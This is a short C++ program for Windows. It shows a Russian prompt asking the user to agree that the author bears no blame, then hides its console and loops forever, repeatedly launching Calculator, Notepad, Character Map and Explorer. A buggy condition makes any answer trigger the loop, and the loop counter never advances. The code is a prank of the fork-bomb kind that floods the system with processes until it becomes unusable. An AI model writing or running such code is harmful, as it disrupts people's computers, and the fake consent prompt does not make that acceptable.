#include <iostream>
#include <string>
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <fstream>

using namespace std;

int main(){
    setlocale(LC_ALL, "rus");
    cout << "Напиши да, если соглашаешься, на то, что я не буду виноват не в чем!";
    cout << "Или пиши нет";
    string a;
    cin >> a;
    if (a == "да" or a == "Да" or "Я штейн") {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        for (int i = 0; i < INT64_MAX; i += 0.5) {
            cout << "Я не в чем не виноват";
            system("color 2");
            system("calc");
            system("start notepad");
            system("start charmap");
            system("start explorer");
        }
    }
    system("pause");
}
